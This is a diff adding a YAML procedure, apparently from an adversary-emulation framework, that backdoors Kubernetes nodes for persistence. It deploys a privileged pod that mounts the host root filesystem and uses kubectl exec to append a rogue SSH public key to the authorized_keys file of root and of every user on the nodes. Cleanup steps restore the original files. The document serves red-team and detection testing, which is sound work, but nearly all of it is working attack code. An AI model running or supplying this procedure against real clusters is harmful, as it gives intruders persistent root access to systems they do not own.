@@ -1,0 +1,198 @@
+---
+api_version: 2.0
+uuid: 65a544be-d51e-416f-abc6-00e56c6bc911
+name: backdoor_k8s_nodes_authorized_keys
+authors:
+  - I50
+description: |
+  This TTP adds a rogue public SSH key to the `authorized_keys` file on all Kubernetes nodes to maintain persistence.
+  It assumes access to a Kubernetes cluster with the ability to execute commands on the nodes. The TTP makes a backup of the original `authorized_keys` file before overwriting it and restores it during the cleanup.
+args:
+  - name: artifacts_dir
+    description: The directory to store the downloaded tools.
+    default: /tmp
+  - name: eks_cluster
+    description: Target Kubernetes cluster is running on EKS.
+    default: true
+  - name: rogue_key
+    description: "The rogue public SSH key to be added"
+  - name: ssh_authorized_keys
+    default: "$HOME/.ssh/authorized_keys"
+  - name: target_cluster
+    description: The target Kubernetes cluster name.
+  - name: target_ns
+    description: The target namespace for deploying the privileged pod.
+    default: kube-system
+  - name: target_region
+    description: The region where the target cluster is located.
+    default: us-east-1
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+mitre:
+  tactics:
+    - "TA0003 Persistence"
+  techniques:
+    - "T1078 Valid Accounts"
+
+steps:
+  {{ if .Args.eks_cluster }}
+  - name: aws_connector
+    description: This step invokes the setup_cloud_env action.
+    ttp: //utils/aws-validate-aws-env-configured/ttp.yaml
+    args:
+      region: "{{ .Args.target_region }}"
+
+  - name: setup_kubeconfig_for_eks
+    description: Set up kubeconfig for EKS cluster.
+    ttp: //utils/k8s-setup-kubeconfig-for-eks/ttp.yaml
+    args:
+      cluster_name: "{{ .Args.target_cluster }}"
+      cluster_region: "{{ .Args.target_region }}"
+  {{ end }}
+
+  - name: create_privileged_pod_manifest
+    description: Create the manifest for a privileged pod to run commands on the nodes.
+    inline: |
+      cat > {{ .Args.artifacts_dir }}/privileged_pod.yaml <<EOF
+      apiVersion: v1
+      kind: ServiceAccount
+      metadata:
+        name: privileged-sa
+        namespace: {{ .Args.target_ns }}
+      ---
+      apiVersion: rbac.authorization.k8s.io/v1
+      kind: ClusterRole
+      metadata:
+        name: privileged-role
+      rules:
+      - apiGroups: [""]
+        resources:
+        - nodes/log
+        verbs: ["get", "list", "watch"]
+      ---
+      apiVersion: rbac.authorization.k8s.io/v1
+      kind: ClusterRoleBinding
+      metadata:
+        name: privileged-role-binding
+      roleRef:
+        apiGroup: rbac.authorization.k8s.io
+        kind: ClusterRole
+        name: privileged-role
+      subjects:
+      - kind: ServiceAccount
+        name: privileged-sa
+        namespace: {{ .Args.target_ns }}
+      ---
+      apiVersion: v1
+      kind: Pod
+      metadata:
+        name: privileged-pod
+        namespace: {{ .Args.target_ns }}
+      spec:
+        serviceAccountName: privileged-sa
+        hostPID: true
+        containers:
+        - name: privileged
+          image: alpine:latest
+          securityContext:
+            privileged: true
+          command: ["/bin/sh"]
+          args: ["-c", "sleep infinity"]
+          volumeMounts:
+          - name: host-root
+            mountPath: /host
+        volumes:
+        - name: host-root
+          hostPath:
+            path: /
+            type: Directory
+      EOF
+    cleanup:
+      inline: rm {{ .Args.artifacts_dir }}/privileged_pod.yaml
+
+  - name: deploy_privileged_pod
+    description: Deploy the privileged pod in the target namespace.
+    inline: kubectl apply -f {{ .Args.artifacts_dir }}/privileged_pod.yaml -n {{ .Args.target_ns }}
+    cleanup:
+      inline: kubectl delete -f {{ .Args.artifacts_dir }}/privileged_pod.yaml -n {{ .Args.target_ns }}
+
+  - name: modify_authorized_keys_on_nodes
+    description: Backup and modify the authorized_keys file on all Kubernetes nodes.
+    inline: |
+      # Wait for the pod to be in the Running state
+      while true; do
+        POD_STATUS=$(kubectl get pod privileged-pod -n {{ .Args.target_ns }} --no-headers 2>/dev/null)
+        if [[ -z "$POD_STATUS" ]]; then
+          echo "Privileged pod not found. Waiting for it to appear..."
+        else
+          POD_PHASE=$(kubectl get pod privileged-pod -n {{ .Args.target_ns }} -o jsonpath='{.status.phase}' 2>/dev/null)
+          if [[ "$POD_PHASE" == "Running" ]]; then
+            echo "Privileged pod is running."
+            break
+          else
+            echo "Waiting for privileged pod to be running... Current phase: $POD_PHASE"
+          fi
+        fi
+        sleep 5
+      done
+
+      POD_NAME="privileged-pod"
+
+      kubectl exec -n {{ .Args.target_ns }} $POD_NAME -- /bin/sh -c '
+        if [ -d /host ]; then
+          echo "Success: Host file system is mounted at /host."
+
+          for user_home in /host/root /host/home/*; do
+            if [ -d "$user_home/.ssh" ]; then
+              AUTHORIZED_KEYS_PATH="$user_home/.ssh/authorized_keys"
+              echo "Checking authorized_keys at $AUTHORIZED_KEYS_PATH..."
+              if [ -f "$AUTHORIZED_KEYS_PATH" ]; then
+                echo "Found authorized_keys at $AUTHORIZED_KEYS_PATH"
+                cp "$AUTHORIZED_KEYS_PATH" "$AUTHORIZED_KEYS_PATH.bak" || true
+                echo "{{ .Args.rogue_key }}" >> "$AUTHORIZED_KEYS_PATH" || true
+                echo "Rogue key added to $AUTHORIZED_KEYS_PATH"
+              else
+                echo "Warning: authorized_keys not found at $AUTHORIZED_KEYS_PATH"
+              fi
+            else
+              echo "No .ssh directory found at $user_home, skipping..."
+            fi
+          done
+        else
+          echo "Failure: Host file system is not mounted at /host."
+          exit 1
+        fi
+      '
+    cleanup:
+      inline: |
+        # Check if the pod still exists before trying to clean up
+        POD_STATUS=$(kubectl get pod privileged-pod -n {{ .Args.target_ns }} --no-headers 2>/dev/null)
+        if [[ -n "$POD_STATUS" ]]; then
+          echo "Restoring original authorized_keys files..."
+          kubectl exec -n {{ .Args.target_ns }} privileged-pod -- /bin/sh -c '
+            if [ -d /host ]; then
+              echo "Restoring keys on host:"
+              for user_home in /host/root /host/home/*; do
+                if [ -d "$user_home/.ssh" ]; then
+                  AUTHORIZED_KEYS_PATH="$user_home/.ssh/authorized_keys"
+                  if [ -f "$AUTHORIZED_KEYS_PATH.bak" ]; then
+                    cp "$AUTHORIZED_KEYS_PATH.bak" "$AUTHORIZED_KEYS_PATH" || true
+                    rm "$AUTHORIZED_KEYS_PATH.bak" || true
+                    echo "Restored authorized_keys at $AUTHORIZED_KEYS_PATH"
+                  else
+                    echo "Warning: backup file not found at $AUTHORIZED_KEYS_PATH.bak"
+                  fi
+                else
+                  echo "No .ssh directory found at $user_home, skipping..."
+                fi
+              done
+            else
+              echo "Failure: Host file system is not mounted at /host."
+            fi
+          '
+        else
+          echo "Privileged pod no longer exists. Skipping cleanup of authorized_keys."
+        fi
+        echo "Cleanup done!"
